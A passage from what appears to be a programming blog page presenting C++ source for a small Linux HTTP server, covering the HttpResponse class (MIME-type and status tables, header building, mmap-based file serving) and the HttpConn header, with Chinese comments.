class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> HTTP_RESPONSE_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HTTP_RESPONSE_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstddef&gt;</span>  <span class="comment">//包括常用类型和宏的定义，比如 size_t 和 NULL。</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span>      <span class="comment">//于提供文件控制操作</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span> <span class="comment">//POSIX操作系统的API</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span>   <span class="comment">//文件状态和属性操作的结构和函数原型</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span>   <span class="comment">//提供了内存映射文件的操作原型</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../buffer/buffer.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../log/log.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">HttpResponse</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">HttpResponse</span>();</span><br><span class="line">    ~<span class="built_in">HttpResponse</span>();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">Init</span><span class="params">(<span class="type">const</span> std::string&amp; srcDir, std::string&amp; path, <span class="type">bool</span> isKeepAlice = <span class="literal">false</span>, <span class="type">int</span> code = <span class="number">-1</span>)</span></span>;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">MakeResponse</span><span class="params">(Buffer&amp; buff)</span></span>;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">UnmapFile</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="type">char</span>* <span class="title">File</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="type">size_t</span> <span class="title">FileLen</span><span class="params">()</span> <span class="type">const</span></span>;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">ErrorContent</span><span class="params">(Buffer&amp; buff, std::string message)</span></span>;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">Code</span><span class="params">()</span> <span class="type">const</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">AddStateLine_</span><span class="params">(Buffer &amp;buff)</span></span>;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">AddHeader_</span><span class="params">(Buffer &amp;buff)</span></span>;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">AddContent_</span><span class="params">(Buffer&amp;buff)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">ErrorHtml_</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function">std::string <span class="title">GetFileType_</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> code_;</span><br><span class="line">    <span class="type">bool</span> isKeepAlive_;</span><br><span class="line"></span><br><span class="line">    std::string path_;</span><br><span class="line">    std::string srcDir_;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span>* mmFile_;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">stat</span> mmFileStat_;</span><br><span class="line"></span><br><span class="line">    <span class="type">static</span> <span class="type">const</span> std::unordered_map&lt;std::string, std::string&gt; SUFFIX_TYPE;</span><br><span class="line">    <span class="type">static</span> <span class="type">const</span> std::unordered_map&lt;<span class="type">int</span>, std::string&gt; CODE_STATUS;</span><br><span class="line">    <span class="type">static</span> <span class="type">const</span> std::unordered_map&lt;<span class="type">int</span> , std::string&gt; CODE_PATH;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="HttpResponse-cpp"><a href="#HttpResponse-cpp" class="headerlink" title="HttpResponse.cpp"></a>HttpResponse.cpp</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;httpresponse.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> std::unordered_map&lt;std::string, std::string&gt; HttpResponse::SUFFIX_TYPE = &#123;</span><br><span class="line">    &#123;<span class="string">&quot;.html&quot;</span>, <span class="string">&quot;text/html&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;.xml&quot;</span>, <span class="string">&quot;text/xml&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;.xhtml&quot;</span>, <span class="string">&quot;application/xhtml+xml&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;.txt&quot;</span>, <span class="string">&quot;text/plain&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;.rtf&quot;</span>, <span class="string">&quot;application/rtf&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;.pdf&quot;</span>, <span class="string">&quot;application/pdf&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;.word&quot;</span>, <span class="string">&quot;application/nsword&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;.png&quot;</span>, <span class="string">&quot;image/png&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;.gif&quot;</span>, <span class="string">&quot;image/gif&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;.jpg&quot;</span>, <span class="string">&quot;image/jpeg&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;.jpeg&quot;</span>, <span class="string">&quot;image/jpeg&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;.au&quot;</span>, <span class="string">&quot;audio/basic&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;.mpeg&quot;</span>, <span class="string">&quot;video/mpeg&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;.mpg&quot;</span>, <span class="string">&quot;video/mpeg&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;.avi&quot;</span>, <span class="string">&quot;video/x-msvideo&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;.gz&quot;</span>, <span class="string">&quot;application/x-gzip&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;.tar&quot;</span>, <span class="string">&quot;application/x-tar&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;.css&quot;</span>, <span class="string">&quot;text/css &quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;.js&quot;</span>, <span class="string">&quot;text/javascript &quot;</span>&#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> std::unordered_map&lt;<span class="type">int</span>, std::string&gt; HttpResponse::CODE_STATUS = &#123;</span><br><span class="line">    &#123;<span class="number">200</span>, <span class="string">&quot;OK&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="number">400</span>, <span class="string">&quot;Bad Request&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="number">403</span>, <span class="string">&quot;Forbidden&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="number">404</span>, <span class="string">&quot;Not Found&quot;</span>&#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> std::unordered_map&lt;<span class="type">int</span>, std::string&gt; HttpResponse::CODE_PATH = &#123;</span><br><span class="line">    &#123;<span class="number">400</span>, <span class="string">&quot;/400.html&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="number">403</span>, <span class="string">&quot;/403.html&quot;</span>&#125;,</span><br><span class="line">    &#123;<span class="number">404</span>, <span class="string">&quot;/404.html&quot;</span>&#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">HttpResponse::<span class="built_in">HttpResponse</span>() &#123;</span><br><span class="line">  code_ = <span class="number">-1</span>;</span><br><span class="line">  path_ = srcDir_ = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  isKeepAlive_ = <span class="literal">false</span>;</span><br><span class="line">  mmFile_ = <span class="literal">nullptr</span>;</span><br><span class="line">  mmFileStat_ = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">HttpResponse::~<span class="built_in">HttpResponse</span>() &#123; <span class="built_in">UnmapFile</span>(); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">HttpResponse::Init</span><span class="params">(<span class="type">const</span> std::string &amp;srcDir, std::string &amp;path,</span></span></span><br><span class="line"><span class="params"><span class="function">                        <span class="type">bool</span> isKeepAlive, <span class="type">int</span> code)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">assert</span>(srcDir != <span class="string">&quot;&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (mmFile_)  <span class="built_in">UnmapFile</span>();</span><br><span class="line">    code_ = code;</span><br><span class="line">    isKeepAlive_ = isKeepAlive;</span><br><span class="line">    path_ = path;</span><br><span class="line">    srcDir_ = srcDir;</span><br><span class="line">    mmFile_ = <span class="literal">nullptr</span>; </span><br><span class="line">    mmFileStat_ = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">HttpResponse::MakeResponse</span><span class="params">(Buffer &amp;buff)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">stat</span>((srcDir_ + path_).<span class="built_in">data</span>(), &amp;mmFileStat_) &lt; <span class="number">0</span> ||</span><br><span class="line">      <span class="built_in">S_ISDIR</span>(mmFileStat_.st_mode))</span><br><span class="line">    code_ = <span class="number">404</span>;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (!(mmFileStat_.st_mode &amp; S_IROTH)) &#123;</span><br><span class="line">    code_ = <span class="number">403</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (code_ == <span class="number">-1</span>) &#123;</span><br><span class="line">    code_ = <span class="number">200</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">ErrorHtml_</span>();</span><br><span class="line">  <span class="built_in">AddStateLine_</span>(buff);</span><br><span class="line">  <span class="built_in">AddHeader_</span>(buff);</span><br><span class="line">  <span class="built_in">AddContent_</span>(buff);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">HttpResponse::UnmapFile</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (mmFile_) &#123;</span><br><span class="line">    <span class="built_in">munmap</span>(mmFile_, mmFileStat_.st_size);</span><br><span class="line">    mmFile_ = <span class="literal">nullptr</span>; <span class="comment">//避免悬垂指针</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">char</span> *<span class="title">HttpResponse::File</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> mmFile_; &#125;</span><br><span class="line"><span class="function"><span class="type">size_t</span> <span class="title">HttpResponse::FileLen</span><span class="params">()</span> <span class="type">const</span> </span>&#123; <span class="keyword">return</span> mmFileStat_.st_size; &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">HttpResponse::ErrorContent</span><span class="params">(Buffer &amp;buff, std::string message)</span> </span>&#123;</span><br><span class="line">  std::string body;</span><br><span class="line">  std::string status;</span><br><span class="line">  body += <span class="string">&quot;&lt;html&gt;&lt;title&gt;Error&lt;/title&gt;&quot;</span>;</span><br><span class="line">  body += <span class="string">&quot;&lt;body bgcolor=\&quot;ffffff\&quot;&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> (CODE_STATUS.<span class="built_in">count</span>(code_) == <span class="number">1</span>) &#123;</span><br><span class="line">    status = CODE_STATUS.<span class="built_in">find</span>(code_)-&gt;second;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    status = <span class="string">&quot;Bad Request&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  body += std::<span class="built_in">to_string</span>(code_) + <span class="string">&quot; : &quot;</span> + status + <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">  body += <span class="string">&quot;&lt;p&gt;&quot;</span> + message + <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">  body += <span class="string">&quot;&lt;hr&gt;&lt;em&gt;TinyWebServer&lt;/em&gt;&lt;/body&gt;&lt;/html&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">  buff.<span class="built_in">Append</span>(<span class="string">&quot;Content-length: &quot;</span> + std::<span class="built_in">to_string</span>(body.<span class="built_in">size</span>()) + <span class="string">&quot;\r\n\r\n&quot;</span>);</span><br><span class="line">  buff.<span class="built_in">Append</span>(body);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">HttpResponse::Code</span><span class="params">()</span> <span class="type">const</span> </span>&#123; <span class="keyword">return</span> code_; &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">HttpResponse::AddStateLine_</span><span class="params">(Buffer &amp;buff)</span> </span>&#123;</span><br><span class="line">  std::string status;</span><br><span class="line">  <span class="keyword">if</span> (CODE_STATUS.<span class="built_in">count</span>(code_) == <span class="number">1</span>) &#123;</span><br><span class="line">    status = CODE_STATUS.<span class="built_in">find</span>(code_)-&gt;second;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    code_ = <span class="number">400</span>;</span><br><span class="line">    status = CODE_STATUS.<span class="built_in">find</span>(code_)-&gt;second;</span><br><span class="line">  &#125;</span><br><span class="line">  buff.<span class="built_in">Append</span>(<span class="string">&quot;HTTP/1.1 &quot;</span> + std::<span class="built_in">to_string</span>(code_) + <span class="string">&quot; &quot;</span> + status +</span><br><span class="line">              <span class="string">&quot;\r\n&quot;</span>); <span class="comment">//别忘了分隔符</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">HttpResponse::AddHeader_</span><span class="params">(Buffer &amp;buff)</span> </span>&#123;</span><br><span class="line">  buff.<span class="built_in">Append</span>(<span class="string">&quot;Connection: &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (isKeepAlive_) &#123;</span><br><span class="line">    buff.<span class="built_in">Append</span>(<span class="string">&quot;keep-alive\r\n&quot;</span>);</span><br><span class="line">    buff.<span class="built_in">Append</span>(<span class="string">&quot;keep-alive: max=6, timeout=120\r\n&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    buff.<span class="built_in">Append</span>(<span class="string">&quot;close\r\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  buff.<span class="built_in">Append</span>(<span class="string">&quot;Content-type: &quot;</span> + <span class="built_in">GetFileType_</span>() + <span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">HttpResponse::AddContent_</span><span class="params">(Buffer &amp;buff)</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> srcFd = <span class="built_in">open</span>((srcDir_ + path_).<span class="built_in">data</span>(), O_RDONLY);</span><br><span class="line">  <span class="keyword">if</span> (srcFd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">ErrorContent</span>(buff, <span class="string">&quot;File NotFound!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">LOG_DEBUG</span>(<span class="string">&quot;file path %s&quot;</span>, (srcDir_ + path_).<span class="built_in">data</span>());</span><br><span class="line">  <span class="type">int</span> *mmRet = (<span class="type">int</span> *)<span class="built_in">mmap</span>(<span class="literal">nullptr</span>, mmFileStat_.st_size, PROT_READ, MAP_PRIVATE,</span><br><span class="line">                           srcFd, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (*mmRet == <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="built_in">ErrorContent</span>(buff, <span class="string">&quot;File NotFound!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  mmFile_ = (<span class="type">char</span> *)mmRet;</span><br><span class="line">  <span class="built_in">close</span>(srcFd);</span><br><span class="line">  buff.<span class="built_in">Append</span>(<span class="string">&quot;Content-length: &quot;</span> + std::<span class="built_in">to_string</span>(mmFileStat_.st_size) +</span><br><span class="line">              <span class="string">&quot;\r\n\r\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">HttpResponse::ErrorHtml_</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (CODE_PATH.<span class="built_in">count</span>(code_) == <span class="number">1</span>) &#123;</span><br><span class="line">    path_ = CODE_PATH.<span class="built_in">find</span>(code_)-&gt;second;</span><br><span class="line">    <span class="built_in">stat</span>((srcDir_ + path_).<span class="built_in">data</span>(), &amp;mmFileStat_);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">std::string <span class="title">HttpResponse::GetFileType_</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">//判断文件类型</span></span><br><span class="line">  std::string::size_type idx = path_.<span class="built_in">find_last_of</span>(<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span> (idx == std::string::npos)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;text/plain&quot;</span>;</span><br><span class="line">  std::string suffix = path_.<span class="built_in">substr</span>(idx, path_.<span class="built_in">length</span>() - idx);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (SUFFIX_TYPE.<span class="built_in">count</span>(suffix) == <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> SUFFIX_TYPE.<span class="built_in">find</span>(suffix)-&gt;second;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;text/plain&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="HttpConn-h"><a href="#HttpConn-h" class="headerlink" title="HttpConn.h"></a>HttpConn.h</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> HTTP_CONN_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HTTP_CONN_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/uio.h&gt;</span>     </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span>   <span class="comment">//ip地址协议等</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span>     </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span>      </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../log/log.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../pool/sqlconnRAII.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../buffer/buffer.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;httprequest.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;httpresponse.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">HttpConn</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">HttpConn</span>();</span><br><span class="line"></span><br><span class="line">    ~<span class="built_in">HttpConn</span>();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">(<span class="type">int</span> sockFd, <span class="type">const</span> sockaddr_in&amp; addr)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">ssize_t</span> <span class="title">read</span><span class="params">(<span class="type">int</span>* saveErrno)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">ssize_t</span> <span class="title">write</span><span class="params">(<span class="type">int</span>* saveErrno)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">Close</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">GetFd</span><span class="params">()</span> <span class="type">const</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">GetPort</span><span class="params">()</span> <span class="type">const</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">const</span> <span class="type">char</span>* <span class="title">GetIP</span><span class="params">()</span> <span class="type">const</span></span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function">sockaddr_in <span class="title">GetAddr</span><span class="params">()</span> <span class="type">const</span></span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">process</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">ToWriteBytes</span><span class="params">()</span> </span>;</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">IsKeepAlive</span><span class="params">()</span> <span class="type">const</span> </span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">static</span> <span class="type">bool</span> isET;</span><br><span class="line">    <span class="type">static</span> <span class="type">const</span> <span class="type">char</span>* srcDir;</span><br><span class="line">    <span class="type">static</span> std::atomic&lt;<span class="type">int</span>&gt; userCount;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">   </span><br><span class="line">    <span class="type">int</span> fd_;</span><br><span class="line">    <span class="keyword">struct</span>  <span class="title class_">sockaddr_in</span> addr_;</span><br><span class="line"></span><br><span class="line">    <span class="type">bool</span> isClose_;</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> iovCnt_;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">iovec</span> iov_[<span class="number">2</span>];</span><br><span class="line">    </span><br><span class="line">    Buffer readBuff_; <span class="comment">// 读缓冲区</span></span><br><span class="line">    Buffer writeBuff_; <span class="comment">// 写缓冲区</span></span><br><span class="line"></span><br><span class="line">    HttpRequest request_;</span><br><span class="line">    HttpResponse response_;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> </span></span><br></pre></td></tr></table></figure><h3 id="HttpConn-cpp"><a href="#HttpConn-cpp" class="headerlink" title="HttpConn.cpp"></a>HttpConn.cpp</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 